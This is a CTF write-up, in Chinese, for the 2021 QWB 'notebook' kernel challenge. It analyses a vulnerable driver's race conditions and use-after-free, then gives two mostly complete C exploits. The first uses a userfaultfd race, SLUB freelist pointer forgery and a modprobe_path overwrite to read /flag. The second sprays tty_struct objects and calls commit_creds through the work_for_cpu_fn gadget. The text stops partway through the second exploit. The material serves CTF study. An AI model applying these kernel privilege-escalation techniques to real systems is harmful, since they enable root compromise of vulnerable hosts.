# 2021qwb-notebook

## 信息收集

启动脚本如下：

```shell
#!/bin/sh
stty intr ^]
qemu-system-x86_64 -m 64M -kernel bzImage -initrd rootfs.cpio -append "loglevel=3 console=ttyS0 oops=panic panic=1 kaslr" -nographic -net user -net nic -device e1000 -smp cores=2,threads=2 -cpu kvm64,+smep,+smap -monitor /dev/null 2>/dev/null -s
```

可见开启了SMEP、SMAP、KASLR、KPTI。

提取文件系统后查看目标驱动和内核保护：

```shell
$ checksec vmlinux
[*] '/home/ivan/kernel/2021qwb-notebook/vmlinux'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0xffffffff81000000)
    RWX:      Has RWX segments
$ checksec notebook.ko
[*] '/home/ivan/kernel/2021qwb-notebook/output/notebook.ko'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x0)

```

init启动脚本如下：

```shell
$ cat init 
#!/bin/sh
/bin/mount -t devtmpfs devtmpfs /dev
chown root:tty /dev/console
chown root:tty /dev/ptmx
chown root:tty /dev/tty
mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts

mount -t proc proc /proc
mount -t sysfs sysfs /sys

echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict

ifup eth0 > /dev/null 2>/dev/null

insmod notebook.ko
cat /proc/modules | grep notebook > /tmp/moduleaddr
chmod 777 /tmp/moduleaddr
chmod 777 /dev/notebook
poweroff -d 300 -f &
echo "Welcome to QWB!"

#sh
setsid cttyhack setuidgid 1000 sh

umount /proc
umount /sys

poweroff -d 1 -n -f
```

可见开启了`kptr_restrict`并且禁用了`dmesg`。

但将module的基地址保存在了`/tmp/moduleaddr`。

查看目标内核版本：

```shell
$ cat /proc/version
Linux version 4.15.8 (root@ubuntu) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #3 SMP Thu Jun 3 01:01:56 PDT 2021
```

在后续测试中还发现开启了`CONFIG_SLAB_FREELIST_HARDENED`和`CONFIG_SLAB_FREELIST_RANDOM`。

## 关键函数分析&漏洞点

`noteadd`:idx不超过0xf，size大小不能超过0x60，若该note指针不为空则重置为原先的size，否则通过`kmalloc`申请size大小将指针返回给该note。

```c
__int64 __fastcall noteadd(size_t idx, size_t size, void *buf)
{
  __int64 v3; // rdx
  __int64 v4; // r13
  note *v5; // rbx
  size_t oldsz; // r14
  __int64 v7; // rbx

  _fentry__();
  if ( idx > 0xF )
  {
    v7 = -1LL;
    printk("[x] Add idx out of range.\n");
  }
  else
  {
    v4 = v3;
    v5 = &notebook[idx];
    raw_read_lock(&lock);
    oldsz = v5->size;
    v5->size = size;
    if ( size > 0x60 )
    {
      v5->size = oldsz;
      v7 = -2LL;
      printk("[x] Add size out of range.\n");
    }
    else
    {
      copy_from_user(name, v4, 0x100LL);
      if ( v5->note )
      {
        v5->size = oldsz;
        v7 = -3LL;
        printk("[x] Add idx is not empty.\n");
      }
      else
      {
        v5->note = (void *)_kmalloc(size, 0x24000C0LL);
        printk("[+] Add success. %s left a note.\n");
        v7 = 0LL;
      }
    }
    raw_read_unlock(&lock);
  }
  return v7;
}
```

`noteedit`: 使用 `realloc` 申请newsize大小的堆块，若newsize为0，则将note指针清空，还需判断新申请堆块返回指针的合法性，若不合法则直接返回，此处未重置size值。

```c
__int64 __fastcall noteedit(size_t idx, size_t newsize, void *buf)
{
  __int64 v3; // rdx
  __int64 v4; // r13
  note *v5; // rbx
  size_t v6; // rax
  __int64 v7; // r12
  __int64 v8; // rbx

  _fentry__();
  if ( idx > 0xF )
  {
    v8 = -1LL;
    printk("[x] Edit idx out of range.\n");
    return v8;
  }
  v4 = v3;
  v5 = &notebook[idx];
  raw_read_lock(&lock);
  v6 = v5->size;
  v5->size = newsize;
  if ( v6 == newsize )
  {
    v8 = 1LL;
    goto editout;
  }
  v7 = (*(__int64 (__fastcall **)(void *, size_t, signed __int64))krealloc.gap0)(v5->note, newsize, 0x24000C0LL);
  copy_from_user(name, v4, 256LL);
  if ( !v5->size )
  {
    printk("free in fact");
    v5->note = 0LL;
    v8 = 0LL;
    goto editout;
  }
  if ( (unsigned __int8)_virt_addr_valid(v7) )
  {
    v5->note = (void *)v7;
    v8 = 2LL;
editout:
    raw_read_unlock(&lock);
    printk("[o] Edit success. %s edit a note.\n");
    return v8;
  }
  printk("[x] Return ptr unvalid.\n");
  raw_read_unlock(&lock);
  return 3LL;
}
```

`notedel`：idx不小于0x10，释放note指针后判断size是否为0，若不为0则设置size为0并将note指针置空，若等于0则直接跳过。

```c
__int64 __fastcall notedel(size_t idx)
{
  note *v1; // rbx
  __int64 result; // rax

  _fentry__();
  if ( idx > 0x10 )
  {
    printk("[x] Delete idx out of range.\n");
    result = -1LL;
  }
  else
  {
    raw_write_lock(&lock);
    v1 = &notebook[idx];
    kfree(notebook[idx].note);
    if ( v1->size )
    {
      v1->size = 0LL;
      v1->note = 0LL;
    }
    raw_write_unlock(&lock);
    printk("[-] Delete success.\n");
    result = 0LL;
  }
  return result;
}
```

`notegift`：后门函数，将notebook中的堆指针返回到用户态。

```c
__int64 __fastcall notegift(void *buf)
{
  _fentry__();
  printk("[*] The notebook needs to be written from beginning to end.\n");
  copy_to_user(buf, notebook, 0x100LL);
  printk("[*] For this special year, I give you a gift!\n");
  return 100LL;
}
```

`mynote_write`：idx不大于0x10,在对note写数据之前通过 `_check_object_size`对note指针、sz进行合法性校验。从这里可以看出该内核开启了`CONFIG_HARDENED_USERCOPY`。

```c
ssize_t __fastcall mynote_write(file *file, const char *buf, size_t idx, loff_t *pos)
{
  unsigned __int64 v4; // rdx
  unsigned __int64 v5; // rdx
  size_t sz; // r13
  void *note_ptr; // rbx
  ssize_t result; // rax

  _fentry__();
  if ( v4 > 0x10 )
  {
    printk("[x] Write idx out of range.\n");
    result = -1LL;
  }
  else
  {
    v5 = v4;
    sz = notebook[v5].size;
    note_ptr = notebook[v5].note;
    _check_object_size(note_ptr, sz, 0LL);
    if ( copy_from_user(note_ptr, buf, sz) )
    {
      printk("[x] copy from user error.\n");
      result = 0LL;
    }
    else
    {
      printk("[*] Write success.\n");
      result = 0LL;
    }
  }
  return result;
}
```

`mynote_read`: 读取note内容前未检查是该note是否被释放，可用来泄露。

```c
ssize_t __fastcall mynote_read(file *file, char *buf, size_t idx, loff_t *pos)
{
  unsigned __int64 v4; // rdx
  unsigned __int64 v5; // rdx
  size_t sz; // r13
  void *note_ptr; // rbx
  ssize_t result; // rax

  _fentry__();
  if ( v4 > 0x10 )
  {
    printk("[x] Read idx out of range.\n");
    result = -1LL;
  }
  else
  {
    v5 = v4;
    sz = notebook[v5].size;
    note_ptr = notebook[v5].note;
    _check_object_size(note_ptr, sz, 1LL);
    copy_to_user(buf, note_ptr, sz);
    printk("[*] Read success.\n");
    result = 0LL;
  }
  return result;
}
```

首先需要了解一下读者/写者自旋锁，读者/写者自旋锁定义为`rwlock_t`数据类型，必须根据读写访问，以不同的方法获取锁：

- 进程对临界区进行读访问时，在进入和离开时需要分别执行`read_lock`和`read_unlock`，内核会允许任意数目的读进程并发访问临界区。
- `write_lock`和`write_unlock`用于写访问，内核保证只有一个写进程(此时没有读进程)能够处于临界区中。

即在题目中`noteadd`和`noteedit`两个加了读者锁的是可以进行条件竞争的，此外`mynote_write`未加锁也是可以和加了写锁的`notedel`进行条件竞争。

此外由于`noteadd`使用`kmalloc`进行堆块申请，未对堆块内容进行清空，可以配合`mynote_read`进行泄漏。

## 方法一

### CONFIG_SLAB_FREELIST_RANDOM

`CONFIG_SLAB_FREELIST_RANDOM`在不同版本实现不同，这里仅分析4.15.8版本中的相关实现。

在这个保护机制中，`kmem_cache`增加了一个`unsigned long`类型的变量`random`，在`kmem_cache_open`函数进行初始化：

```c
static int kmem_cache_open(struct kmem_cache *s, slab_flags_t flags)
{
...
#ifdef CONFIG_SLAB_FREELIST_HARDENED
	s->random = get_random_long();
#endif
...
}
```

在`set_freepointer`函数中，`BUG_ON`实现了类似ptmalloc中fastbin的检查double free的方法：

```c
static inline void set_freepointer(struct kmem_cache *s, void *object, void *fp)
{
	unsigned long freeptr_addr = (unsigned long)object + s->offset;

#ifdef CONFIG_SLAB_FREELIST_HARDENED
	BUG_ON(object == fp); /* naive detection of double free or corruption */
#endif

	*(void **)freeptr_addr = freelist_ptr(s, fp, freeptr_addr);
}
```

接下来的`freelist_ptr`函数将当前块的freelist指针、该指针的地址和`kmem_cache`的random异或得到freelist 指针的返回值。

```c
/*
 * Returns freelist pointer (ptr). With hardening, this is obfuscated
 * with an XOR of the address where the pointer is held and a per-cache
 * random number.
 */
static inline void *freelist_ptr(const struct kmem_cache *s, void *ptr,
				 unsigned long ptr_addr)
{
#ifdef CONFIG_SLAB_FREELIST_HARDENED
	return (void *)((unsigned long)ptr ^ s->random ^ ptr_addr);
#else
	return ptr;
#endif
}
```

`get_freepointer`用于返回下一个空闲块，也是同样调用`freelist_ptr`异或计算。

### 利用思路



大致利用思路如下：

- 首先读取`/tmp/moduleaddr`，获得驱动基址
- 之后通过`noteadd`申请两块堆块并用`notegift`泄露堆地址，再`notedel`掉这两个堆块并用`mynote_read`可以读取异或加密过的堆指针，根据这三个值可以异或还原`s->random`值
- 使用userfaultfd，当使用`mynote_write`调用`copy_from_user`时停住，此时调用`notedel`将堆块删除，在写`notebook`指针地址-0x10到目标堆块的freelist字段。（这里在尝试使用userfaultfd时，只有在handler内`poll(&pollfd, 1, -1)`后调用`notedel`才能达到uaf的效果）
- 由于开启了`CONFIG_SLAB_FREELIST_RANDOM`，需要通过申请大量堆块，找到之前伪造的目标堆块。将目标堆块的freelist伪造成 `notebook_ptr-0x10`。（这里有一个细节当我们伪造堆块时，还需要通过`noteadd`在`notebook_ptr-0x10`处伪造下一个freelist指针，因为开启了`CONFIG_SLAB_FREELIST_HARDENED`，如果没有开启这地方直接设为0即可，但开启之后`__kmalloc`在分配完当前堆块后会调用`get_freepointer`解密下一个freelist指针地址，如果不对其进行伪造内核将抛出异常）。

```
            +---------------+     +---------------+      +---------------+
            |               |     |               |      |               |
            |    heap 0     +---->|fake freelist  +----->|fake zero ptr  |
            |               |     |(notebook_ptr-0|      |               |
            |               |     |x10)           |      |               |
            +---------------+     +---------------+      +---------------+
```



- 申请到fake freelist的堆块后，通过`mynote_write`将模块偏移0x168作为地址写入idx为0的位置，用`mynote_read`读出4字节，之后通过计算获得`_copy_from_user`地址进而算出内核基址。（这里简述一下计算方法：例如模块偏移0x167处的汇编指令为`call    _copy_from_user`，动态调试时的机器码为`E8 C4 4A 47 C1`，call的机器码为E8，`0xc1474ac4` 是`_copy_from_user`的偏移地址，该地址计算方法如下：偏移地址=目标地址-当前地址-5。假设模块基址为`0xffffffffc0002000`，那么目标地址即 `_copy_from_user`的真实地址为：`((0xc1474ac4+0x5+0xffffffffc0002000+0x167)|0xffffffff00000000)& 0xffffffffffffffff=0xffffffff81476c30` ）
- 再次将一个堆地址写入 `modprobe_path`地址，用`modprobe_path`提权即可。

在实际复现过程中发现0x60大小堆块不太容易重复申请到，应该可以用`noteedit`将堆块调大后再进行利用会稳定一些。绑定cpu核也可以提高稳定性： `sched_setaffinity(0, 1, &cpu_mask);`

### exp

```c
#include <stdio.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sched.h>
#include <errno.h>
#include <pty.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <pthread.h>
#include <linux/userfaultfd.h>
#include <unistd.h>
#include <poll.h>
#include <stdint.h>
#include <assert.h>

#define DEV_NOTE "/dev/notebook"
#define TTY_STRUCT 704
#define PAGE_SIZE 0x1000
#define CHUNK_SIZE 0x100

struct userarg {
        size_t idx;
        size_t size;
        void * buf;
};

int fd;
int tty_fd;
size_t fault_page;
size_t fault_page_len;
size_t mod_base;
size_t notebook_addr;
size_t secret;
size_t heap[2];

size_t raw_modprobe_path=0xffffffff8225d2e0;
size_t raw_vmlinux_base=0xffffffff81000000;
size_t raw_copy_from_user=0xffffffff81476c30;
size_t copy_from_user;
size_t modprobe_path;
size_t vmlinux_base;

void info(const char *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    fprintf(stdout, "[.] ");
    vfprintf(stdout, fmt, args);
    va_end(args);
}

void msg(const char *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    fprintf(stdout, "[*] ");
    vfprintf(stdout, fmt, args);
    va_end(args);
}

void fail(const char *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    fprintf(stdout, "[x] ");
    vfprintf(stdout, fmt, args);
    va_end(args);
    exit(1);
}


void initFD(){
        fd = open(DEV_NOTE,O_RDWR);
        if(fd < 0){
                fail("dev open fail!");
        }
}
void noteadd(size_t index,size_t size,void* buf){
        struct userarg arg;
	size_t res;
        arg.idx = index;
        arg.size = size;
        arg.buf = buf;
        res = ioctl(fd,0x100,&arg);
	if(res < 0){
		fail("noteadd error!");
	
	}
}
void noteedit(size_t index,size_t size,void* buf){
        struct userarg arg;
	size_t res;
        arg.idx = index;
        arg.size = size;
        arg.buf = buf;
        res = ioctl(fd,0x300,&arg);
	if(res < 0){
		fail("noteedit error!");
	}
}
void notegift(void* buf){
        struct userarg arg;
	size_t res;
        arg.buf = buf;
        res = ioctl(fd,0x64,&arg);
	if(res < 0){
		fail("notegift error!");
	}
}
void notedel(size_t index){
        struct userarg arg;
        arg.idx = index;
        ioctl(fd,0x200,&arg);
}
void noteread(void* buf,size_t idx){
        size_t res;
        res = read(fd,buf,idx);
        if(res < 0){
                fail("noteread failed!");
                exit(-1);
        }
}
void notewrite(void* buf,size_t idx){
        size_t res;
        res = write(fd,buf,idx);
        if(res < 0){
                fail("notewrte failed!");
                exit(-1);
        }
}
static void *
race_write_fault_handler_thread(void *arg)
{
    static struct uffd_msg ffd_msg;
    long uffd;                   
    static char *page = NULL;
    struct uffdio_copy uffdio_copy;
    uint32_t i;

    uffd = (long) arg;

    msg("handler created ...\n");

    struct pollfd pollfd;
    int nready;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    nready = poll(&pollfd, 1, -1);
    if (nready == -1)
        fail("poll");

    msg("Trigger !\n");

    notedel(0);
    
    if(read(uffd, &ffd_msg, sizeof(ffd_msg)) != sizeof(ffd_msg)){
        fail("read uffd_msg failed");
    }    

    assert(ffd_msg.event == UFFD_EVENT_PAGEFAULT);

    size_t target = secret^(notebook_addr-0x10)^heap[0];
    msg("target value: %lx\n",target);
    uint64_t DATA[2] = {target,0};

    uffdio_copy.src = (unsigned long) DATA;

    //uffdio_copy.dst = (unsigned long) ffd_msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
    uffdio_copy.dst = (unsigned long) fault_page; 
    uffdio_copy.len = fault_page_len;
    uffdio_copy.mode = 0;
    //uffdio_copy.copy = 0;
    if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
        fail("ioctl-UFFDIO_COPY");

    msg("Done !\n");
}
void race_write_register_userfault()
{

   long uffd;          /* userfaultfd file descriptor */
   struct uffdio_api uffdio_api;
   struct uffdio_register uffdio_register;
   pthread_t thr;      /* ID of thread that handles page faults */

   uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
   if (uffd == -1)
	   fail("userfaultfd");

   uffdio_api.api = UFFD_API;
   uffdio_api.features = 0;
   if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
	   fail("ioctl-UFFDIO_API");

   uffdio_register.range.start = fault_page;
   uffdio_register.range.len = fault_page_len;
   uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
   if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
	   fail("ioctl-UFFDIO_REGISTER");

   if (pthread_create(&thr, NULL, race_write_fault_handler_thread, (void *) uffd)){
       fail("pthread_create");
   }
}

void race_write_heap()
{
    char *user_data;
    user_data = (char*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (user_data == MAP_FAILED)
        fail("mmap");
    printf("Address returned by mmap() = %p\n", user_data);

    fault_page = (uint64_t)user_data;
    fault_page_len = PAGE_SIZE;
    // register mmap memory
    race_write_register_userfault();

    notewrite(user_data,0);
}
int main(){
	char *tmp_buf=calloc(1,TTY_STRUCT);
	char buf[CHUNK_SIZE];
	initFD();
	//get module base
	FILE * stream = popen("cat /tmp/moduleaddr | awk '{print $6}'","r");
	fread(tmp_buf,18,1,stream);
	mod_base = strtoul(tmp_buf,NULL,16);
	notebook_addr = mod_base+0x2500;
	msg("mod_base: %lx\n",mod_base);
	
	//calculate secret value
	memset(buf,0x0,sizeof(buf));
	noteadd(0,0x60,buf);
	noteadd(1,0x60,buf);
	//memset(tmp_buf,0,sizeof(tmp_buf));
	notegift(tmp_buf);
	heap[0] = *(size_t*)tmp_buf;
	heap[1] = *(size_t*)(tmp_buf+0x10);
	msg("heap 0 : %lx\n",heap[0]);
	msg("heap 1 : %lx\n",heap[1]);

	notedel(1);
	notedel(0);
	noteadd(0,0x60,buf);
	noteadd(1,0x60,buf);
	noteread(tmp_buf,0);
	msg("leaked ptr : %lx\n",*(size_t*)tmp_buf);	
	secret = *((size_t*)tmp_buf)^heap[0]^heap[1];
	msg("secret : %lx\n",secret);

	//userfaultfd uaf
	race_write_heap();


	//find target
	notedel(1);
	*(size_t*)(buf+0xf0)=secret^(notebook_addr-0x10);
	size_t tmp_chunk,i;
	for(i=0;i<0x10;i++){
		noteadd(i,0x60,buf);
		notegift(tmp_buf);
		tmp_chunk=*(size_t*)(tmp_buf+0x10*i);
		if(tmp_chunk == heap[0]){
			i++;
			msg("Target Index: %d\n",i);
			break;
		}
		else if(i==0xf){
			fail("Target not found");
		}
	}
	noteadd(i,0x60,buf);
	//leak kernel base
	size_t fake_chunk[0x10]={0};
	fake_chunk[2]=mod_base+0x168;
	fake_chunk[3]=4;
	fake_chunk[4]=notebook_addr;
	fake_chunk[5]=0x100;
	notewrite(fake_chunk,i);
	noteread(tmp_buf,0);	
	copy_from_user = ((*(uint32_t*)tmp_buf+mod_base+0x167+0x5)|0xffffffff00000000)&0xffffffffffffffff;
	msg("copy_from_user: %lx\n",copy_from_user);
	vmlinux_base = copy_from_user + raw_vmlinux_base - raw_copy_from_user;
	msg("vmlinux_base: %lx\n",vmlinux_base);

	modprobe_path = vmlinux_base + raw_modprobe_path - raw_vmlinux_base;
	//write modprobe path
	fake_chunk[0]=modprobe_path;
	fake_chunk[1]=0x10;
	notewrite(fake_chunk,1);
	
	strcpy(buf,"/tmp/copy.sh");
	notewrite(buf,0);
	system("echo -ne '#!/bin/sh\n/bin/cp /flag /tmp/flag\n/bin/chmod 777 /tmp/flag' > /tmp/copy.sh");
	system("chmod +x /tmp/copy.sh");
	system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
	system("chmod +x /tmp/dummy");
	
	system("/tmp/dummy");
	
	close(fd);

        return 0;
}
```

## 方法二

### 利用思路

第二种思路总结一下0x300R给出的思路：

- 首先先通过`noteadd`和`noteedit`申请多个`0x2e0`大小的堆块，用来给`tty_struct`结构体占位用。

- 用`pthread_create`在另一线程调用`noteedit`申请大于`0x2e0`的堆块，通过userfaultfd让其卡在`copy_from_user`处不再执行后面代码。
  这里我们先看下`krealloc`的实现：

  ```c
  void *krealloc(const void *p, size_t new_size, gfp_t flags)
  {
  	void *ret;
  
  	if (unlikely(!new_size)) {
  		kfree(p);
  		return ZERO_SIZE_PTR;
  	}
  
  	ret = __do_krealloc(p, new_size, flags);
  	if (ret && p != ret)
  		kfree(p);
  
  	return ret;
  }
  EXPORT_SYMBOL(krealloc);
  ```

  这里可以看到，当重新申请后会释放掉原来的指针。题目中申请到新指针后并没有立即更新，而原先申请的堆块已经释放掉，这就形成了UAF。

  这时再通过`openpty`创建大量tty对象，将之前占位的堆块申请回来。

- 由于我们在上一步操作中将堆块size改为一个较大值，之后如果直接对这些堆块进行写入会被`mynote_write`中`_check_object_size`函数检测到移除而抛出异常。因此需要在写入之前将堆块size改小，方法类似上一步，用`noteadd`重新申请堆块，通过userfaultfd 将其卡在`copy_from_user`处不再执行后面代码。虽然只能控制`0x2e0`大小中的`0x60`但也足够了。

- 接下来通过`mynote_read`泄漏`tty_struct`结构体，通过text段的函数指针获得内核基址，从而绕过KASLR。

- 这里介绍一种完全控制tty对象时非常好用的gadget。首先来看下内核中的`work_for_cpu_fn`函数：

  ```c
  struct work_for_cpu {
  	struct work_struct work;
  	long (*fn)(void *);
  	void *arg;
  	long ret;
  };
  
  static void work_for_cpu_fn(struct work_struct *work)
  {
  	struct work_for_cpu *wfc = container_of(work, struct work_for_cpu, work);
  
  	wfc->ret = wfc->fn(wfc->arg);
  }
  ```

  反编译后如下所示：

  ```c
  __int64 __fastcall work_for_cpu_fn(__int64 a1)
  
  {
  
    __int64 result; // rax
  
    _fentry__(a1);
  
    result = (*(__int64 (__fastcall **)(_QWORD))(a1 + 32))(*(_QWORD *)(a1 + 40));
  
    *(_QWORD *)(a1 + 48) = result;
  
    return result;
  
  }
  ```

  该函数位于 workqueue 机制的实现中，只要是开启了多核支持的内核 （CONFIG_SMP）都会包含这个函数的代码。 不难注意到，这个函数非常好用，只要能控制第一个参数指向的内存，即可实现带一个任意参数调用任意函数，并把返回值存回第一个参数指向的内存的功能，且该 “gadget” 能干净的返回，执行的过程中完全不用管 SMAP、SMEP 的事情。提权需要执行`commit_creds(prepare_kernel_cred(0))`，因此调用两次上述gadget即可实现。

### exp

```c
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/fs.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <semaphore.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <pty.h>

#define CHECK(expr)		\
  if ((expr) == -1) {		\
    do {            		\
      perror(#expr);		\
      exit(EXIT_FAILURE);	\
    } while (0);		\
  }

const uint64_t v_prepare_kernel_cred = 0xFFFFFFFF810A9EF0;
const uint64_t v_prepare_creds = 0xFFFFFFFF810A9D60;
const uint64_t v_commit_creds = 0xFFFFFFFF810A9B40;
const uint64_t v_work_for_cpu_fn = 0xFFFFFFFF8109EB90;
const uint64_t v_pty_unix98_ops = 0xFFFFFFFF81E8E320;
const uint64_t kOffset_pty_unix98_ops = 0xe8e320;
const uint64_t kOffset_ptm_unix98_ops = 0xe8e440;


#define FAULT_PAGE 0x41410000
#define TARGET_SIZE 0x2e0
#define SUPER_BIG 0x2000
#define MAX_PTY_SPRAY 64
#define MAX_CATCHERS 8


char* stuck_forever = (char*)(FAULT_PAGE);
int fd;
char buffer[4096];


static void hexdump(void* data, size_t size) {
  unsigned char* _data = data;
  for (size_t i = 0; i < size; i++) {
    if (i && i % 16 == 0) putchar('\n');
    printf("%02x ", _data[i]);
  }
  putchar('\n');
}


struct note_userarg {
  uint64_t idx;
  uint64_t size;
  char *buf;
};


struct k_note {
  uint64_t mem;
  uint64_t size;
} note_in_kernel[16];


static void add_note(int idx, uint64_t size, char *buf) {
  struct note_userarg n;
  n.idx = idx;
  n.size = size;
  n.buf = buf;
  ioctl(fd, 0x100, &n);
}


static void del_note(int idx) {
  struct note_userarg n;
  n.idx = idx;
  ioctl(fd, 0x200, &n);
}


static void edit_note(int idx, uint64_t size, char *buf) {
  struct note_userarg n;
  n.idx = idx;
  n.size = size;
  n.buf = buf;
  ioctl(fd, 0x300, &n);
}


static void gift() {
  struct note_userarg n;
  n.buf = buffer;
  ioctl(fd, 0x64, &n);
  memcpy(note_in_kernel, buffer, sizeof(note_in_kernel));
}


static void debug_display_notes() {
  gift();
  printf("Notes:\n");
  for (int i = 0; i < 16; i++) {
    printf("%d:\tptr = %#lx, size = %#lx\n", i, note_in_kernel[i].mem,
           note_in_kernel[i].size);
  }
}


static void register_userfault() {
  struct uffdio_api ua;
  struct uffdio_register ur;
  pthread_t thr;
  uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);

  CHECK(uffd);
  ua.api = UFFD_API;
  ua.features = 0;
  CHECK(ioctl(uffd, UFFDIO_API, &ua));
  if (mmap((void *)FAULT_PAGE, 0x1000, PROT_READ | PROT_WRITE,
           MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1,
           0) != (void *)FAULT_PAGE) {
    perror("mmap");
    exit(EXIT_FAILURE);
  }
  ur.range.start = (uint64_t)FAULT_PAGE;
  ur.range.len = 0x1000;
  ur.mode = UFFDIO_REGISTER_MODE_MISSING;
  CHECK(ioctl(uffd, UFFDIO_REGISTER, &ur));
  // I’m not going to respond to userfault requests, let those kernel threads
  // stuck FOREVER!

}


/* ————- Legacy from 2017 —————– */

struct tty_driver {};
struct tty_struct {};
struct file {};
struct ktermios {};
struct termiox {};
struct serial_icounter_struct {};

struct tty_operations {

        struct tty_struct *        (*lookup)(struct tty_driver *, struct file *, int); /*     0     8 */

        int                        (*install)(struct tty_driver *, struct tty_struct *); /*     8     8 */

        void                       (*remove)(struct tty_driver *, struct tty_struct *); /*    16     8 */

        int                        (*open)(struct tty_struct *, struct file *); /*    24     8 */

        void                       (*close)(struct tty_struct *, struct file *); /*    32     8 */

        void                       (*shutdown)(struct tty_struct *); /*    40     8 */

        void                       (*cleanup)(struct tty_struct *); /*    48     8 */

        int                        (*write)(struct tty_struct *, const unsigned char  *, int); /*    56     8 */

        /* — cacheline 1 boundary (64 bytes) — */

        int                        (*put_char)(struct tty_struct *, unsigned char); /*    64     8 */

        void                       (*flush_chars)(struct tty_struct *); /*    72     8 */

        int                        (*write_room)(struct tty_struct *); /*    80     8 */

        int                        (*chars_in_buffer)(struct tty_struct *); /*    88     8 */

        int                        (*ioctl)(struct tty_struct *, unsigned int, long unsigned int); /*    96     8 */

        long int                   (*compat_ioctl)(struct tty_struct *, unsigned int, long unsigned int); /*   104     8 */

        void                       (*set_termios)(struct tty_struct *, struct ktermios *); /*   112     8 */

        void                       (*throttle)(struct tty_struct *); /*   120     8 */

        /* — cacheline 2 boundary (128 bytes) — */

        void                       (*unthrottle)(struct tty_struct *); /*   128     8 */

        void                       (*stop)(struct tty_struct *); /*   136     8 */

        void                       (*start)(struct tty_struct *); /*   144     8 */

        void                       (*hangup)(struct tty_struct *); /*   152     8 */

        int                        (*break_ctl)(struct tty_struct *, int); /*   160     8 */

        void                       (*flush_buffer)(struct tty_struct *); /*   168     8 */

        void                       (*set_ldisc)(struct tty_struct *); /*   176     8 */

        void                       (*wait_until_sent)(struct tty_struct *, int); /*   184     8 */

        /* — cacheline 3 boundary (192 bytes) — */

        void                       (*send_xchar)(struct tty_struct *, char); /*   192     8 */

        int                        (*tiocmget)(struct tty_struct *); /*   200     8 */

        int                        (*tiocmset)(struct tty_struct *, unsigned int, unsigned int); /*   208     8 */

        int                        (*resize)(struct tty_struct *, struct winsize *); /*   216     8 */

        int                        (*set_termiox)(struct tty_struct *, struct termiox *); /*   224     8 */

        int                        (*get_icount)(struct tty_struct *, struct serial_icounter_struct *); /*   232     8 */

        const struct file_operations  * proc_fops;       /*   240     8 */


        /* size: 248, cachelines: 4, members: 31 */

        /* last cacheline: 56 bytes */

};


struct tty_operations fake_ops;

/* ———————————————— */


sem_t edit_go;

void* victim_thread_edit(void* i) {
  sem_wait(&edit_go);
  edit_note((int)i, SUPER_BIG, stuck_forever);
  return NULL;
}


sem_t add_go;

void* victim_thread_add(void* i) {
  sem_wait(&add_go);
  add_note((int)i, 0x60, stuck_forever);
  return NULL;
}

int main(int argc, char *argv[]) {

  unsigned char cpu_mask = 0x01;
  sched_setaffinity(0, 1, &cpu_mask); // [1]
  char* name = calloc(1, 0x100);
  sem_init(&edit_go, 0, 0);
  sem_init(&add_go, 0, 0);
  register_userfault();

  fd = open("/dev/notebook", 2);
  CHECK(fd);

  for (int i = 0; i < MAX_CATCHERS; i++) {
    add_note(i, 0x60, name);
    edit_note(i, TARGET_SIZE, name);
  }
  puts("[=] Before dancing:");
  debug_display_notes();

  pthread_t thr;
  for (int i = 0; i < MAX_CATCHERS; i++) {
    if (pthread_create(&thr, NULL, victim_thread_edit, (void*)i)) {
      perror("pthread_create");
      exit(EXIT_FAILURE);
    }
  }

  for (int i = 0; i < MAX_CATCHERS; i++) sem_post(&edit_go);
  printf("[+] noteedit thread launched, wait for 1 second.\n");
  sleep(1);
  
  int pty_masters[MAX_PTY_SPRAY], pty_slaves[MAX_PTY_SPRAY];
  for (int i = 0; i < MAX_PTY_SPRAY; i++) {
    if (openpty(&pty_masters[i], &pty_slaves[i], NULL, NULL, NULL) == -1) {
      perror("openpty");
      exit(1);
    }
  }
  puts("[=] After noteedit:");
  debug_display_notes();

  for (int i = 0; i < MAX_CATCHERS; i++) {
    if (pthread_create(&thr, NULL, victim_thread_add, (void*)i)) {
      perror("pthread_create");
      exit(EXIT_FAILURE);
    }
  }

  for (int i = 0; i < MAX_CATCHERS; i++) sem_post(&add_go);
  printf("[+] noteadd thread launched, wait for 1 second.\n");
  sleep(1);
  puts("[=] After noteadd:");
  debug_display_notes();

  uint64_t kernel_slide = 0;
  uint64_t kernel_base = 0;
  int victim_idx = 0;

  // probe
  for (int i = 0; i < MAX_CATCHERS; i++) {
    printf("[=] Note %d:\n", i);
    read(fd, buffer, 0);
    hexdump(buffer, 0x60);

